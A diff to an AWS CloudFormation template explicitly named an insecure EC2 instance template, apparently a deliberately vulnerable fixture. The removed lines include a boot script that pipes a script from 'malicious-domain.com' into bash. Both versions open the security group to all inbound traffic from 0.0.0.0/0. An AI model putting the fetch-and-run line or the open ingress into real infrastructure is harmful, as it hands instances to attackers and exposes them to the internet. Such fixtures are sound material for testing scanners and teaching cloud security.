@@ -1,45 +1,45 @@
 {
-    "AWSTemplateFormatVersion": "2010-09-09",
-    "Description": "Insecure EC2 instance template",
-    "Resources": {
-      "InsecureSecurityGroup": {
-        "Type": "AWS::EC2::SecurityGroup",
-        "Properties": {
-          "GroupDescription": "Allow all inbound traffic - INSECURE",
-          "SecurityGroupIngress": [
-            {
-              "IpProtocol": "-1",
-              "CidrIp": "0.0.0.0/0"
-            }
-          ],
-          "VpcId": "vpc-123456"
-        }
-      },
-      "InsecureEC2Instance": {
-        "Type": "AWS::EC2::Instance",
-        "Properties": {
-          "ImageId": "ami-12345678",
-          "InstanceType": "t2.micro",
-          "KeyName": "my-key",
-          "SecurityGroupIds": [
-            {
-              "Ref": "InsecureSecurityGroup"
-            }
-          ],
-          "UserData": {
-            "Fn::Base64": {
-              "Fn::Join": [
-                "",
-                [
-                  "#!/bin/bash\n",
-                  "yum update -y\n",
-                  "curl http://malicious-domain.com/script.sh | bash\n"
-                ]
+  "AWSTemplateFormatVersion": "2010-09-09",
+  "Description": "Insecure EC2 instance template",
+  "Resources": {
+    "InsecureSecurityGroup": {
+      "Type": "AWS::EC2::SecurityGroup",
+      "Properties": {
+        "GroupDescription": "Allow all inbound traffic - INSECURE",
+        "SecurityGroupIngress": [
+          {
+            "IpProtocol": "tcp",
+            "CidrIp": "0.0.0.0/0",
+            "FromPort": "0",
+            "ToPort": "65535"
+          }
+        ],
+        "VpcId": "vpc-123456"
+      }
+    },
+    "InsecureEC2Instance": {
+      "Type": "AWS::EC2::Instance",
+      "Properties": {
+        "ImageId": "ami-12345678",
+        "InstanceType": "t2.micro",
+        "KeyName": "my-key",
+        "SecurityGroupIds": [
+          {
+            "Ref": "InsecureSecurityGroup"
+          }
+        ],
+        "UserData": {
+          "Fn::Base64": {
+            "Fn::Join": [
+              "",
+              [
+                "#!/bin/bash\n",
+                "yum update -y\n"
               ]
-            }
+            ]
           }
         }
       }
     }
   }
-  
+}
